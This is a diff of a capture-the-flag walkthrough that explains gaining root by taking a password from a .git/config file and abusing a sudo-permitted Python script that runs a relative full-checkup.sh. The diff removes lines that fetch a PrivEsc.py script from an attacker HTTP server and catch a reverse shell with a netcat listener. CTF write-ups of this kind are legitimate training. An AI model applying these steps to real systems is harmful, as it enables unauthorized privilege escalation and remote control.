@@ -56,28 +56,9 @@ python3 exploit.py
 **Use sudo -l and use python3 /opt/scripts/system-checkup.py to get root**
 ### Exploit
 
-- I found svc password in /var/www/app/.git/config file and used it to ssh.
-- Run sudo -l and found that we can run /usr/bin/python3 /opt/scripts/system-checkup.py * using sudo.
-- I cd to /opt/scripts/ and run the command sudo /usr/bin/python3 /opt/scripts/system-checkup.py and found that is has 3 args docker-ps, docker-inspect and full-checkup and I tried all of them and found that full-checkup run a file locate in the same directory called full-checkup.sh.
-- So I cd to /tmp and create file called full-checkup.sh that contain simple command id and chmod +x full-checkup.sh and run ``sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-check``upand now I am root.
-  
-  - Run Simple HTTP Server on Attacker Machine.
-    
-    ```
-    python3 http.server 8000
-    ```
-  - Download PriEsc.py on Target Machine.
-    
-    ```
-    wget http://<Local_IP>:8000/PrivEsc.py
-    ```
-- Run netcat listener on Attacker Machine
+- I found svc password in ``/var/www/app/.git/config`` file and used it to ssh.
+- Run sudo -l and found that we can run ``/usr/bin/python3 /opt/scripts/system-checkup.py *`` using sudo.
+- I cd to ``/opt/scripts/`` and run the command ``sudo /usr/bin/python3 /opt/scripts/system-checkup.py`` and found that is has 3 args docker-ps, docker-inspect and full-checkup and I tried all of them and found that full-checkup run a file locate in the same directory called full-checkup.sh.
+- So I cd to /tmp and create file called ``full-checkup.sh`` that contain simple command id and ``chmod +x full-checkup.sh`` and run ``sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-check``upand now I am root.
+![image](https://user-images.githubusercontent.com/59315492/231019258-1e9834d7-ab03-439b-a14f-c7dc892c0366.png)
 
-    ```
-    nc -nlvp 4444
-    ```
-- Run PrivEsc.py and wait for Root shell connection it may take a while.
-
-    ```
-    python3 PrivEsc.py
-    ```
